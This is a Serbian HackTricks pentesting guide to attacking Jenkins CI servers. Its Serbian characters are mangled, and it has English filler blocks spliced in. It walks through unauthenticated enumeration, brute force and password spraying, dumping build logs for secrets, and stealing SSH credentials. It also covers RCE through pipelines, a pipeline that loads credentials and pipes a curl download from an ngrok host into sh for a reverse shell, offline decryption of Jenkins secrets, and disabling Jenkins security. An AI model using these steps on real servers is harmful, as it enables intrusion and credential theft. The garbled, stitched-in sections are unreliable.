# Jenkins bezbednost

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini da podrÅ¾ite HackTricks:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

Jenkins je alat koji nudi jednostavan naÄin za uspostavljanje **kontinuirane integracije** ili **kontinuirane dostave** (CI/CD) okruÅ¾enja za skoro **bilo koju** kombinaciju **programskih jezika** i izvornih kodova koristeÄ‡i pipeline-ove. Osim toga, on automatizuje razne rutinske razvojne zadatke. Iako Jenkins ne eliminiÅ¡e **potrebu za kreiranjem skripti za pojedinaÄne korake**, pruÅ¾a brÅ¾i i pouzdaniji naÄin za integraciju celokupnog niza alata za izgradnju, testiranje i implementaciju od onog koji se moÅ¾e lako konstruisati ruÄno.


{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

## Neautentifikovano nabrojavanje

Da biste pretraÅ¾ivali zanimljive Jenkins stranice bez autentifikacije kao Å¡to su (_/people_ ili _/asynchPeople_, ovo lista trenutne korisnike) moÅ¾ete koristiti:
```
msf> use auxiliary/scanner/http/jenkins_enum
```
Proverite da li moÅ¾ete izvrÅ¡iti komande bez potrebe za autentifikacijom:
```
msf> use auxiliary/scanner/http/jenkins_command
```
Bez akreditacija moÅ¾ete pogledati unutar putanje _**/asynchPeople/**_ ili _**/securityRealm/user/admin/search/index?q=**_ za **korisniÄka imena**.

MoÅ¾da Ä‡ete moÄ‡i dobiti verziju Jenkins-a putem putanje _**/oops**_ ili _**/error**_

![](<../../.gitbook/assets/image (48).png>)

### Poznate ranjivosti

{% embed url="https://github.com/gquere/pwn_jenkins" %}

## Prijava

U osnovnim informacijama moÅ¾ete provjeriti **sve naÄine za prijavu u Jenkins**:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Registracija

MoÅ¾ete pronaÄ‡i instance Jenkins-a koje **omoguÄ‡avaju stvaranje raÄuna i prijavu unutar njega. Tako jednostavno.**

### **SSO prijava**

Ako su **SSO funkcionalnosti/pluginovi** prisutni, trebali biste pokuÅ¡ati se **prijaviti** na aplikaciju koristeÄ‡i testni raÄun (npr. testni **Github/Bitbucket raÄun**). Trik sa [**ovde**](https://emtunc.org/blog/01/2018/research-misconfigured-jenkins-servers/).

### Brute force

**Jenkins** nema **pravila za lozinke** i **zaÅ¡titu od brute force napada na korisniÄka imena**. Bitno je izvrÅ¡iti **brute force napad** na korisnike jer se mogu koristiti **slabe lozinke** ili **korisniÄka imena kao lozinke**, Äak i **obrnuta korisniÄka imena kao lozinke**.
```
msf> use auxiliary/scanner/http/jenkins_login
```
### Prskanje lozinki

Koristite [ovaj Python skript](https://github.com/gquere/pwn_jenkins/blob/master/password_spraying/jenkins_password_spraying.py) ili [ovaj PowerShell skript](https://github.com/chryzsh/JenkinsPasswordSpray).

### Bypass IP Whitelisting

Mnoge organizacije kombinuju **SaaS bazirane sisteme za upravljanje izvornim kodom (SCM)** kao Å¡to su GitHub ili GitLab sa **internim, samohostovanim CI** reÅ¡enjem poput Jenkins-a ili TeamCity-ja. Ova konfiguracija omoguÄ‡ava CI sistemima da **primaju webhook dogaÄ‘aje od SaaS platformi za upravljanje izvornim kodom**, uglavnom za pokretanje pipeline poslova.

Da bi se to postiglo, organizacije **dodaju na belu listu** **IP opsege** SCM platformi, omoguÄ‡avajuÄ‡i im pristup **internom CI sistemu** putem webhook-ova. MeÄ‘utim, vaÅ¾no je napomenuti da **bilo ko** moÅ¾e napraviti **nalog** na GitHub-u ili GitLab-u i konfigurisati ga da **pokrene webhook**, potencijalno Å¡aljuÄ‡i zahteve **internom CI sistemu**.

Proverite:
[shttps://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/](https://www.cidersecurity.io/blog/research/how-we-abused-repository-webhooks-to-access-internal-ci-systems-at-scale/)

## Zloupotrebe internog Jenkins-a

U ovim scenarijima pretpostavljamo da imate validan nalog za pristup Jenkins-u.

{% hint style="warning" %}
Zavisno od konfigurisanog mehanizma **Autorizacije** u Jenkins-u i dozvola kompromitovanog korisnika, **moÅ¾da Ä‡ete ili neÄ‡ete moÄ‡i izvrÅ¡iti sledeÄ‡e napade**.
{% endhint %}

Za viÅ¡e informacija pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

### Lista korisnika

Ako ste pristupili Jenkins-u, moÅ¾ete videti listu drugih registrovanih korisnika na [http://127.0.0.1:8080/asynchPeople/](http://127.0.0.1:8080/asynchPeople/)

### Dumpovanje izgradnji radi pronalaÅ¾enja tekstualnih tajni

Koristite [ovaj skript](https://github.com/gquere/pwn_jenkins/blob/master/dump_builds/jenkins_dump_builds.py) za dumpovanje konzolnih izlaza izgradnji i okruÅ¾enjskih promenljivih izgradnji kako biste, nadamo se, pronaÅ¡li tekstualne tajne.
```bash
python3 jenkins_dump_builds.py -u alice -p alice http://127.0.0.1:8080/ -o build_dumps
cd build_dumps
gitleaks detect --no-git -v
```
### **KraÄ‘a SSH akreditacija**

Ako kompromitovani korisnik ima **dovoljno privilegija da kreira/modifikuje novi Jenkins Ävor** i SSH akreditacije veÄ‡ su saÄuvane za pristup drugim Ävorovima, on moÅ¾e **ukrasti te akreditacije** tako Å¡to Ä‡e kreirati/modifikovati Ävor i **postaviti domaÄ‡ina koji Ä‡e zabeleÅ¾iti akreditacije** bez provere kljuÄa domaÄ‡ina:

![](<../../.gitbook/assets/image (56).png>)

ObiÄno Ä‡ete pronaÄ‡i Jenkins SSH akreditacije u **globalnom provajderu** (`/credentials/`), pa ih moÅ¾ete izvuÄ‡i kao i bilo koju drugu tajnu informaciju. ViÅ¡e informacija u [**sekciji o izvlaÄenju tajni**](./#dumping-secrets).

### **RCE u Jenkins-u**

Dobijanje **shell-a na Jenkins serveru** daje napadaÄu moguÄ‡nost da otkrije sve **tajne** i **env promenljive** i da **iskoristi druge maÅ¡ine** smeÅ¡tene u istoj mreÅ¾i ili Äak da **prikupi akreditacije za cloud**.

Jenkins Ä‡e po defaultu **raditi kao SISTEM**. Dakle, kompromitovanje ga Ä‡e dati napadaÄu **SISTEM privilegije**.

### **RCE Kreiranje/Modifikacija projekta**

Kreiranje/Modifikacija projekta je naÄin da se dobije RCE nad Jenkins serverom:

{% content-ref url="jenkins-rce-creating-modifying-project.md" %}
[jenkins-rce-creating-modifying-project.md](jenkins-rce-creating-modifying-project.md)
{% endcontent-ref %}

### **RCE IzvrÅ¡avanje Groovy skripte**

TakoÄ‘e moÅ¾ete dobiti RCE izvrÅ¡avanjem Groovy skripte, Å¡to moÅ¾e biti prikrivenije od kreiranja novog projekta:

{% content-ref url="jenkins-rce-with-groovy-script.md" %}
[jenkins-rce-with-groovy-script.md](jenkins-rce-with-groovy-script.md)
{% endcontent-ref %}

### RCE Kreiranje/Modifikacija Pipeline-a

TakoÄ‘e moÅ¾ete dobiti **RCE kreiranjem/modifikacijom pipeline-a**:

{% content-ref url="jenkins-rce-creating-modifying-pipeline.md" %}
[jenkins-rce-creating-modifying-pipeline.md](jenkins-rce-creating-modifying-pipeline.md)
{% endcontent-ref %}

## Eksploatacija Pipeline-a

Da biste eksploatisali pipeline-ove, i dalje morate imati pristup Jenkins-u.

### Build Pipeline-ovi

**Pipeline-ovi** se takoÄ‘e mogu koristiti kao **mehanizam izgradnje u projektima**, u tom sluÄaju moÅ¾e se konfigurisati **fajl unutar repozitorijuma** koji Ä‡e sadrÅ¾ati sintaksu pipeline-a. Po defaultu se koristi `/Jenkinsfile`:

![](<../../.gitbook/assets/image (14) (1) (1).png>)

TakoÄ‘e je moguÄ‡e **Äuvati fajlove konfiguracije pipeline-a na drugim mestima** (u drugim repozitorijumima na primer) sa ciljem **razdvajanja** pristupa repozitorijumu i pristupa pipeline-u.

Ako napadaÄ ima **pristup za pisanje nad tim fajlom**, biÄ‡e u moguÄ‡nosti da ga **modifikuje** i **potencijalno pokrene** pipeline Äak i bez pristupa Jenkins-u.\
MoguÄ‡e je da Ä‡e napadaÄu biti potrebno da **zaobiÄ‘e neka ograniÄenja grane** (zavisno od platforme i privilegija korisnika, moguÄ‡e je da Ä‡e biti zaobiÄ‘ena ili ne).

NajÄeÅ¡Ä‡i okidaÄi za izvrÅ¡avanje prilagoÄ‘enog pipeline-a su:

* **Pull zahtev** na glavnu granu (ili potencijalno na druge grane)
* **Push na glavnu granu** (ili potencijalno na druge grane)
* **AÅ¾uriranje glavne grane** i Äekanje da se nekako izvrÅ¡i

{% hint style="info" %}
Ako ste **eksterni korisnik**, ne biste trebali oÄekivati da moÅ¾ete kreirati **PR na glavnoj grani** repozitorijuma **drugog korisnika/organizacije** i **pokrenuti pipeline**... ali ako je **loÅ¡e konfigurisano**, moÅ¾ete potpuno **kompromitovati kompanije samo eksploatacijom ovoga**.
{% endhint %}

### Pipeline RCE

U prethodnom odeljku o RCE-u veÄ‡ je naznaÄena tehnika za [**dobijanje RCE-a modifikovanjem pipeline-a**](./#rce-creating-modifying-pipeline).

### Provera Env promenljivih

MoguÄ‡e je deklarisati **env promenljive u Äistom tekstu** za ceo pipeline ili za odreÄ‘ene faze. Ove env promenljive **ne bi trebalo da sadrÅ¾e osetljive informacije**, ali napadaÄ uvek moÅ¾e **proveriti sve konfiguracije pipeline-a**/Jenkinsfile-ove:
```bash
pipeline {
agent {label 'built-in'}
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
```
### IzvlaÄenje tajni

Za informacije o tome kako se tajne obiÄno tretiraju u Jenkinsu, pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

Poverenja mogu biti **ograniÄena na globalne provajdere** (`/credentials/`) ili na **specifiÄne projekte** (`/job/<ime-projekta>/configure`). Dakle, da biste izvukli sve tajne, morate **kompromitovati barem sve projekte** koji sadrÅ¾e tajne i izvrÅ¡iti prilagoÄ‘ene/zatrovane pipeline-ove.

Postoji joÅ¡ jedan problem, da biste dobili **tajnu unutar env-a** pipeline-a, morate **znati ime i tip tajne**. Na primer, ako pokuÅ¡ate da **uÄitate** tajnu **`usernamePassword`** kao **`string`** tajnu, dobiÄ‡ete ovu **greÅ¡ku**:
```
ERROR: Credentials 'flag2' is of type 'Username with password' where 'org.jenkinsci.plugins.plaincredentials.StringCredentials' was expected
```
Evo naÄina za uÄitavanje nekih uobiÄajenih vrsta tajni:

```markdown
### Environment Variables

To load secrets from environment variables, you can use the following syntax:

```bash
$ echo $SECRET_VARIABLE
```

### Configuration Files

To load secrets from configuration files, you can use the following syntax:

```bash
$ cat /path/to/config/file | grep secret_key
```

### Key Management Systems

To load secrets from key management systems, you can use the following syntax:

```bash
$ aws secretsmanager get-secret-value --secret-id my_secret
```

### Vault Secrets Engine

To load secrets from the Vault Secrets Engine, you can use the following syntax:

```bash
$ vault read secret/my_secret
```

### Jenkins Credentials Plugin

To load secrets from the Jenkins Credentials Plugin, you can use the following syntax:

```groovy
withCredentials([string(credentialsId: 'my_secret', variable: 'SECRET_VARIABLE')]) {
    sh 'echo $SECRET_VARIABLE'
}
```

### Kubernetes Secrets

To load secrets from Kubernetes Secrets, you can use the following syntax:

```bash
$ kubectl get secret my_secret -o jsonpath="{.data.SECRET_VARIABLE}" | base64 --decode
```

### Azure Key Vault

To load secrets from Azure Key Vault, you can use the following syntax:

```bash
$ az keyvault secret show --name my_secret --vault-name my_vault --query value -o tsv
```

### Google Cloud Secret Manager

To load secrets from Google Cloud Secret Manager, you can use the following syntax:

```bash
$ gcloud secrets versions access latest --secret=my_secret
```
```
```bash
withCredentials([usernamePassword(credentialsId: 'flag2', usernameVariable: 'USERNAME', passwordVariable: 'PASS')]) {
sh '''
env #Search for USERNAME and PASS
'''
}

withCredentials([string(credentialsId: 'flag1', variable: 'SECRET')]) {
sh '''
env #Search for SECRET
'''
}

withCredentials([usernameColonPassword(credentialsId: 'mylogin', variable: 'USERPASS')]) {
sh '''
env # Search for USERPASS
'''
}

# You can also load multiple env variables at once
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
env
'''
}
```
Na kraju ove stranice moÅ¾ete **pronaÄ‡i sve vrste akreditacija**: [https://www.jenkins.io/doc/pipeline/steps/credentials-binding/](https://www.jenkins.io/doc/pipeline/steps/credentials-binding/)

{% hint style="warning" %}
Najbolji naÄin da **odjednom izvuÄete sve tajne** je **kompromitovanje** Jenkins maÅ¡ine (na primer, pokretanje obrnutog Å¡koljka u **ugraÄ‘enom Ävoru**) a zatim **prosleÄ‘ivanje** **glavnih kljuÄeva** i **Å¡ifrovanih tajni** i njihovo deÅ¡ifrovanje van mreÅ¾e.\
ViÅ¡e o tome kako to uraditi moÅ¾ete pronaÄ‡i u [sekciji o Ävorovima i agentima](./#nodes-and-agents) i u [sekciji o post-eksploataciji](./#post-exploitation).
{% endhint %}

### OkidaÄi

Prema [dokumentaciji](https://www.jenkins.io/doc/book/pipeline/syntax/#triggers): Direktiva `triggers` definiÅ¡e **automatizovane naÄine na koje treba ponovo pokrenuti Pipeline**. Za Pipelines koji su integrisani sa izvorom kao Å¡to su GitHub ili BitBucket, `triggers` moÅ¾da neÄ‡e biti potrebni jer Ä‡e veÄ‡ biti prisutna integracija zasnovana na webhook-ovima. Trenutno dostupni okidaÄi su `cron`, `pollSCM` i `upstream`.

Primer koda za cron:
```bash
triggers { cron('H */4 * * 1-5') }
```
Pogledajte **druge primere u dokumentaciji**.

### ÄŒvorovi i agenti

Instanca **Jenkins-a** moÅ¾e imati **razliÄite agente koji se pokreÄ‡u na razliÄitim maÅ¡inama**. Sa perspektive napadaÄa, pristup razliÄitim maÅ¡inama znaÄi **razliÄite potencijalne kredencijale za cloud** koje je moguÄ‡e ukrasti ili **razliÄit pristup mreÅ¾i** koji se moÅ¾e zloupotrebiti za napad na druge maÅ¡ine.

Za viÅ¡e informacija pogledajte osnovne informacije:

{% content-ref url="basic-jenkins-information.md" %}
[basic-jenkins-information.md](basic-jenkins-information.md)
{% endcontent-ref %}

MoÅ¾ete nabrojati **konfigurisane Ävorove** u `/computer/`, obiÄno Ä‡ete pronaÄ‡i \*\*`Built-In Node` \*\* (koji je Ävor na kojem se izvrÅ¡ava Jenkins) i potencijalno joÅ¡ neke:

![](<../../.gitbook/assets/image (25).png>)

Posebno je interesantno kompromitovati ugraÄ‘eni Ävor jer sadrÅ¾i osetljive informacije o Jenkins-u.

Da biste naznaÄili da Å¾elite **pokrenuti** pipeline **na ugraÄ‘enom Jenkins Ävoru**, moÅ¾ete specificirati sledeÄ‡u konfiguraciju unutar pipeline-a:
```bash
pipeline {
agent {label 'built-in'}
```
### Potpuni primer

Pipeline u odreÄ‘enom agentu, sa cron okidaÄem, sa pipeline i stage env promenljivama, uÄitavanje 2 promenljive u koraku i slanje reverzne ljuske:
```bash
pipeline {
agent {label 'built-in'}
triggers { cron('H */4 * * 1-5') }
environment {
GENERIC_ENV_VAR = "Test pipeline ENV variables."
}

stages {
stage("Build") {
environment {
STAGE_ENV_VAR = "Test stage ENV variables."
}
steps {
withCredentials([usernamePassword(credentialsId: 'amazon', usernameVariable: 'USERNAME', passwordVariable: 'PASSWORD'),
string(credentialsId: 'slack-url',variable: 'SLACK_URL'),]) {
sh '''
curl https://reverse-shell.sh/0.tcp.ngrok.io:16287 | sh PASS
'''
}
}
}

post {
always {
cleanWs()
}
}
}
```
Metasploit je moÄ‡an alat za post eksploataciju koji se Äesto koristi u pentestiranju. OmoguÄ‡ava hakere da iskoriste ranjivosti sistema i dobiju pristup ciljnom raÄunaru. Metasploit pruÅ¾a Å¡irok spektar modula i eksploata koji se mogu koristiti za izvrÅ¡avanje razliÄitih napada. Ovaj alat takoÄ‘e podrÅ¾ava automatizaciju napada i omoguÄ‡ava hakere da brzo i efikasno iskoriste ranjivosti. Metasploit je jedan od najpopularnijih alata za post eksploataciju i Äesto se koristi u profesionalnom pentestiranju.
```
msf> post/multi/gather/jenkins_gather
```
### Jenkins Tajne

MoÅ¾ete izlistati tajne pristupanjem `/credentials/` ako imate dovoljno dozvola. Imajte na umu da Ä‡e ovo samo izlistati tajne unutar datoteke `credentials.xml`, ali **konfiguracione datoteke za izgradnju** mogu takoÄ‘e imati **viÅ¡e tajni**.

Ako moÅ¾ete **videti konfiguraciju svakog projekta**, takoÄ‘e moÅ¾ete videti u njoj **imena tajni (secrets)** koje se koriste za pristupanje repozitorijumu i **druge tajne projekta**.

![](<../../.gitbook/assets/image (9) (1) (1) (1) (1).png>)

#### Iz Groovy-ja

{% content-ref url="jenkins-dumping-secrets-from-groovy.md" %}
[jenkins-dumping-secrets-from-groovy.md](jenkins-dumping-secrets-from-groovy.md)
{% endcontent-ref %}

#### Sa diska

Ove datoteke su potrebne za **dekripciju Jenkins tajni**:

* secrets/master.key
* secrets/hudson.util.Secret

Takve **tajne se obiÄno mogu naÄ‡i u**:

* credentials.xml
* jobs/.../build.xml
* jobs/.../config.xml

Evo regexa za njihovo pronalaÅ¾enje:
```bash
# Find the secrets
grep -re "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"
# Print only the filenames where the secrets are located
grep -lre "^\s*<[a-zA-Z]*>{[a-zA-Z0-9=+/]*}<"

# Secret example
credentials.xml: <secret>{AQAAABAAAAAwsSbQDNcKIRQMjEMYYJeSIxi2d3MHmsfW3d1Y52KMOmZ9tLYyOzTSvNoTXdvHpx/kkEbRZS9OYoqzGsIFXtg7cw==}</secret>
```
#### Dekriptuj Jenkins tajne offline

Ako ste izvukli **potrebne lozinke za dekripciju tajni**, koristite [**ovaj skript**](https://github.com/gquere/pwn\_jenkins/blob/master/offline\_decryption/jenkins\_offline\_decrypt.py) **za dekripciju tih tajni**.
```bash
python3 jenkins_offline_decrypt.py master.key hudson.util.Secret cred.xml
06165DF2-C047-4402-8CAB-1C8EC526C115
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAt985Hbb8KfIImS6dZlVG6swiotCiIlg/P7aME9PvZNUgg2Iyf2FT
```
#### Dekriptuj Jenkins tajne iz Groovy-ja

```groovy
import hudson.util.Secret

def decryptSecret(String encryptedSecret) {
    def secret = Secret.decrypt(encryptedSecret)
    return secret.getPlainText()
}

def encryptedSecret = "encrypted_secret_here"
def decryptedSecret = decryptSecret(encryptedSecret)
println(decryptedSecret)
```

Ovaj Groovy skriptu koristi Jenkins API da dekriptuje tajne koje su enkriptovane u Jenkinsu. Funkcija `decryptSecret` prima enkriptovanu tajnu kao argument i vraÄ‡a dekriptovanu verziju. 

Da biste koristili ovaj skript, zamenite `"encrypted_secret_here"` sa stvarnom enkriptovanom tajnom koju Å¾elite da dekriptujete. Nakon izvrÅ¡avanja skripte, dekriptovana tajna Ä‡e biti prikazana.
```bash
println(hudson.util.Secret.decrypt("{...}"))
```
### Kreiranje novog admin korisnika

1. Pristupite datoteci config.xml u Jenkinsu na putanji `/var/lib/jenkins/config.xml` ili `C:\Program Files (x86)\Jenkis\`.
2. PotraÅ¾ite reÄ `<useSecurity>true</useSecurity>` i promenite reÄ **`true`** u **`false`**.
1. `sed -i -e 's/<useSecurity>true</<useSecurity>false</g' config.xml`
3. **Restartujte** Jenkins server: `service jenkins restart`.
4. Sada se ponovo prijavite na Jenkins portal i ovaj put Jenkins neÄ‡e traÅ¾iti nikakve pristupne podatke. Idite na "**Manage Jenkins**" da biste ponovo postavili administratorsku lozinku.
5. Ponovo **omoguÄ‡ite** bezbednost tako Å¡to Ä‡ete promeniti postavke u `<useSecurity>true</useSecurity>` i **ponovo restartovati Jenkins**.

## Reference

* [https://github.com/gquere/pwn\_jenkins](https://github.com/gquere/pwn\_jenkins)
* [https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/](https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/)
* [https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password](https://www.pentestgeek.com/penetration-testing/hacking-jenkins-servers-with-no-password)
* [https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html](https://www.lazysystemadmin.com/2018/12/quick-howto-reset-jenkins-admin-password.html)
* [https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072](https://medium.com/cider-sec/exploiting-jenkins-build-authorization-22bf72926072)
* [https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3](https://medium.com/@Proclus/tryhackme-internal-walk-through-90ec901926d3)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu**, proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
